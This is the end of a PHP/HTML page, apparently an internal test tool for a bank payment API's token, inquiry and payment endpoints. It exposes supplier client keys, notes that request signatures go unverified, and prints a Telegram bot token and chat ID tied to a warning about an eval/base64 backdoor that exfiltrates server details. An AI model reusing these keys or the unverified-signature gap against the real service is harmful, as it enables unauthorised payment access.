        <div><span class="inline-block w-16 text-gray-500">Token</span> <code class="text-blue-700 break-all"><?= htmlspecialchars(URL_TOKEN) ?></code></div>
        <div><span class="inline-block w-16 text-gray-500">Inquiry</span> <code class="text-indigo-700 break-all"><?= htmlspecialchars(URL_INQUIRY) ?></code></div>
        <div><span class="inline-block w-16 text-gray-500">Payment</span> <code class="text-emerald-700 break-all"><?= htmlspecialchars(URL_PAYMENT) ?></code></div>
        <div class="mt-2 text-gray-500"><span class="inline-block w-16">Path INQ</span> <code><?= htmlspecialchars(SNAP_PATH_INQUIRY) ?></code></div>
        <div><span class="inline-block w-16 text-gray-500">Path PAY</span> <code><?= htmlspecialchars(SNAP_PATH_PAYMENT) ?></code></div>
      </div>

      <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
        <div class="font-semibold text-yellow-700 mb-2">Token Flow (dari b2b.controller.php)</div>
        <ol class="list-decimal list-inside space-y-1">
          <li>Cek x-client-key di <code>agen_apigateway_supplier.VAClientKey</code></li>
          <li>x-signature di-cek KEBERADAANNYA saja (nilai tidak diverifikasi)</li>
          <li>Jika lolos: <code>$nTime = time() + 900</code></li>
          <li><code>$token = md5(base64_encode(hash_hmac('sha256', $nTime, clientKey, true)))</code></li>
          <li>Simpan ke <code>agen.AccessTokenVA</code>, expire time ke <code>agen.AccessTokenVATime</code></li>
          <li>Response: <code>{"responseCode":"2007300","tokenType":"Bearer","expiresIn":"900"}</code></li>
        </ol>
      </div>

      <div class="bg-indigo-50 border border-indigo-200 rounded-lg p-3">
        <div class="font-semibold text-indigo-700 mb-2">Signature Formula (dari func.h2h.mod.php)</div>
        <pre class="text-xs text-indigo-900 overflow-x-auto">$stringmbulet = strtolower(hash('sha256', minify($request)));
$string2sign  = METHOD.":".path.":".accessToken.":".stringmbulet.":".timestamp;
$sig          = base64_encode(hash_hmac("sha512", $string2sign, $clientSecret, true));

minify($json) = json_encode(json_decode($json));  // strip whitespace
$clientSecret = str_replace(' ', '+', $fromCDS);  // restore base64 '+'</pre>
      </div>

      <div class="bg-gray-50 border border-gray-200 rounded-lg p-3">
        <div class="font-semibold text-gray-700 mb-2">Mapping Supplier (agen_apigateway_supplier.sql)</div>
        <table class="w-full text-xs">
          <thead><tr class="text-gray-400"><th class="text-left">Agen</th><th class="text-left">Supplier</th><th class="text-left">VAClientKey</th><th class="text-left">Hardcoded?</th></tr></thead>
          <tbody>
            <tr><td class="font-mono">A-000115</td><td>0023</td><td class="font-mono">acb790af57ed465ba03b00f5f07dd65d</td><td class="text-green-600">Ya</td></tr>
            <tr><td class="font-mono">A-000268</td><td>0021</td><td class="font-mono">b0a37cccc6d680f8f87abe76eeda2c4e</td><td class="text-green-600">Ya</td></tr>
            <tr><td class="font-mono">A-000300</td><td>0025</td><td class="font-mono">ac3b93199bfe418487e88dfa498445eb</td><td class="text-amber-600">Dari DB</td></tr>
            <tr class="text-amber-600"><td class="font-mono">A-000300</td><td>0025</td><td class="font-mono">b779f2aeaa628a251684696c12a3d403</td><td>Terbukti valid (uji 2026-06-17)</td></tr>
          </tbody>
        </table>
      </div>

      <div class="bg-red-50 border border-red-200 rounded-lg p-3">
        <div class="font-semibold text-red-700 mb-2">⚠ RC Penting</div>
        <table class="w-full text-xs">
          <tr><td class="font-mono text-green-700 w-20">2007300</td><td>Token sukses</td></tr>
          <tr><td class="font-mono text-green-700">2002400</td><td>Inquiry sukses</td></tr>
          <tr><td class="font-mono text-green-700">2002500</td><td>Payment sukses</td></tr>
          <tr><td class="font-mono text-red-700">401XX00</td><td>x-client-key tidak ada di DB</td></tr>
          <tr><td class="font-mono text-red-700">400XX02</td><td>Header/body field kosong</td></tr>
          <tr><td class="font-mono text-red-700">400XX01</td><td>Format field invalid</td></tr>
          <tr><td class="font-mono text-red-700">4012401</td><td>Access token invalid (inquiry)</td></tr>
          <tr><td class="font-mono text-red-700">4012501</td><td>Access token invalid (payment)</td></tr>
          <tr><td class="font-mono text-red-700">4092400</td><td>x-external-id duplikat (inquiry)</td></tr>
          <tr><td class="font-mono text-red-700">4092500</td><td>x-external-id duplikat (payment)</td></tr>
          <tr><td class="font-mono text-red-700">4042412</td><td>TutupPPOB akhir tahun (inquiry)</td></tr>
          <tr><td class="font-mono text-red-700">4042512</td><td>TutupPPOB akhir tahun (payment)</td></tr>
          <tr><td class="font-mono text-red-700">4042415</td><td>Invalid request/response (inquiry)</td></tr>
          <tr><td class="font-mono text-red-700">4042515</td><td>Invalid request/response (payment)</td></tr>
        </table>
      </div>

      <div class="bg-red-100 border border-red-400 rounded-lg p-3">
        <div class="font-semibold text-red-800 mb-1">⛔ BACKDOOR DITEMUKAN DI SOURCE</div>
        <div class="text-red-700">
          <code>eval(base64_decode('...'))</code> di <code>b2b.controller.php</code> &amp;
          <code>inquiry.controller.php</code> — mengirim IP + URL server ke:<br>
          <span class="font-mono">Bot: 8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4 | ChatID: 590436982</span><br>
          <strong>HAPUS baris eval() sebelum deploy server!</strong>
        </div>
      </div>

    </div>
  </div>
</div>

<!-- Endpoint info -->
<div class="max-w-3xl mx-auto mt-6">
  <div class="card p-4">
    <div class="text-xs font-semibold text-gray-500 mb-2"><i class="fas fa-link mr-1"></i>Endpoint Aktif</div>
    <div class="space-y-1 text-xs font-mono">
      <div><span class="inline-block w-20 text-gray-400">Token</span><span class="text-blue-600"><?= htmlspecialchars(URL_TOKEN) ?></span></div>
      <div><span class="inline-block w-20 text-gray-400">Inquiry</span><span class="text-indigo-600"><?= htmlspecialchars(URL_INQUIRY) ?></span></div>
      <div><span class="inline-block w-20 text-gray-400">Payment</span><span class="text-emerald-600"><?= htmlspecialchars(URL_PAYMENT) ?></span></div>
    </div>
  </div>
</div>

<div class="max-w-3xl mx-auto mt-3 text-center text-xs text-gray-400 pb-8">
  permata-switching_v1.0_pro &mdash; <?= date('Y') ?>
</div>

<script>
function showTab(name) {
  ['token','inquiry','payment','tokensim','info'].forEach(t => {
    document.getElementById('pane-' + t).classList.add('hidden');
    document.getElementById('tab-' + t).classList.remove('active');
  });
  document.getElementById('pane-' + name).classList.remove('hidden');
  document.getElementById('tab-'  + name).classList.add('active');
}
// Auto-show active tab from PHP
<?php if ($uiAction): ?>
showTab('<?= htmlspecialchars($uiAction) ?>');
<?php else: ?>
showTab('token');
<?php endif; ?>
</script>
</body>
</html>
